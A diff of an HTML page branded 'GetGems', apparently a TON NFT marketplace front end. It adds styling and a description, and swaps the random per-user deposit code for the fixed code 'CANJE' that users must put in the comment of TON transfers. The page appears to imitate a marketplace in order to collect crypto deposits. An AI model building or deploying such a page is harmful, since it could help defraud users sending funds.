@@ -84,6 +84,45 @@
             margin-bottom: 20px;
         }
         
+        .marketplace-info {
+            background: linear-gradient(135deg, rgba(0, 136, 204, 0.1), rgba(0, 170, 255, 0.1));
+            border: 2px solid rgba(0, 136, 204, 0.3);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: left;
+            backdrop-filter: blur(10px);
+        }
+        
+        .marketplace-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #0088cc, #00aaff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .diamond-icon {
+            color: #00aaff;
+            font-size: 24px;
+        }
+        
+        .marketplace-text {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #ccc;
+            margin-bottom: 15px;
+        }
+        
+        .ton-feature {
+            color: #00aaff;
+            font-weight: 600;
+        }
+        
         .photo-container {
             margin: 30px auto;
             width: 200px;
@@ -96,6 +135,7 @@
             font-size: 64px;
             color: white;
             box-shadow: 0 10px 30px rgba(0, 136, 204, 0.3);
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
         }
         
         .ton-icon {
@@ -113,7 +153,7 @@
             font-size: 18px;
             border-radius: 25px;
             cursor: pointer;
-            margin-top: 30px;
+            margin-top: 20px;
             width: 100%;
             font-weight: 600;
             transition: transform 0.2s;
@@ -262,18 +302,19 @@
         }
         
         .code-container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 20px;
+            background: linear-gradient(135deg, rgba(0, 136, 204, 0.1), rgba(0, 170, 255, 0.1));
+            border: 2px solid rgba(0, 136, 204, 0.3);
             border-radius: 15px;
-            margin: 30px 0;
+            padding: 25px;
+            margin: 20px 0;
             text-align: center;
-            border-left: 4px solid #0088cc;
+            backdrop-filter: blur(10px);
         }
         
         .code-label {
             font-size: 18px;
             color: #aaa;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
         
         .code {
@@ -283,15 +324,18 @@
             color: #00aaff;
             font-family: monospace;
             background: rgba(0, 0, 0, 0.3);
-            padding: 10px 20px;
+            padding: 15px 25px;
             border-radius: 10px;
             display: inline-block;
+            margin: 10px 0;
+            border: 2px solid rgba(0, 170, 255, 0.3);
         }
         
         .code-hint {
             font-size: 14px;
             color: #aaa;
             margin-top: 10px;
+            line-height: 1.5;
         }
         
         @keyframes fadeIn {
@@ -316,14 +360,27 @@
     <div class="page active" id="page1">
         <div class="welcome-container">
             <div class="getgems-logo">GetGems</div>
+            
             <div class="photo-container">
-                <div class="ton-icon">TON</div>
+                <div class="ton-icon">◇</div>
             </div>
+            
+            <div class="marketplace-info">
+                <div class="marketplace-title">
+                    <span class="diamond-icon">◇</span> GetGems — Marketplace
+                </div>
+                <p class="marketplace-text">
+                    Это NFT-маркетплейс и торговая платформа, созданная в экосистеме 
+                    <span class="ton-feature">TON (The Open Network)</span>. Он позволяет пользователям безопасно покупать, продавать NFT и управлять цифровыми активами.
+                </p>
+            </div>
+            
             <div class="code-container">
                 <div class="code-label">Ваш уникальный код для пополнения:</div>
-                <div class="code" id="userCode">ABCDE</div>
+                <div class="code">CANJE</div>
                 <div class="code-hint">Используйте этот код как комментарий при переводе TON</div>
             </div>
+            
             <button class="continue-btn" onclick="goToPage(2)">
                 Продолжить
             </button>
@@ -392,13 +449,10 @@
                 </div>
                 <p class="info-text">
                     Сумму которую хотите пополнить и введите комментарий:<br>
-                    <strong><span id="userCodeInModal">ABCDE</span></strong>
+                    <strong><span id="userCodeInModal">CANJE</span></strong>
                 </p>
                 <p class="info-text warning">
                     Если вы не укажите комментарий средства не будут пополнены ‼️
-                </p>
-                <p class="info-text">
-                    Ваш уникальный код также отображается на главной странице
                 </p>
             </div>
             <button class="continue-btn" onclick="copyWallet()">
@@ -417,17 +471,6 @@
         
         let currentPage = 1;
         let balance = 0;
-        let userCode = generateRandomCode();
-        
-        // Generate random 5-letter code
-        function generateRandomCode() {
-            const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            let code = '';
-            for (let i = 0; i < 5; i++) {
-                code += letters.charAt(Math.floor(Math.random() * letters.length));
-            }
-            return code;
-        }
         
         function goToPage(pageNumber) {
             document.getElementById('page' + currentPage).classList.remove('active');
@@ -455,8 +498,9 @@
         }
         
         function copyCode() {
-            navigator.clipboard.writeText(userCode).then(() => {
-                alert('Код скопирован: ' + userCode);
+            const code = 'CANJE';
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Код скопирован: ' + code);
             });
         }
         
@@ -477,9 +521,8 @@
         
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            // Set user code
-            document.getElementById('userCode').textContent = userCode;
-            document.getElementById('userCodeInModal').textContent = userCode;
+            // Set fixed code
+            document.getElementById('userCodeInModal').textContent = 'CANJE';
             
             // Initialize balance display
             document.getElementById('balance').textContent = balance;
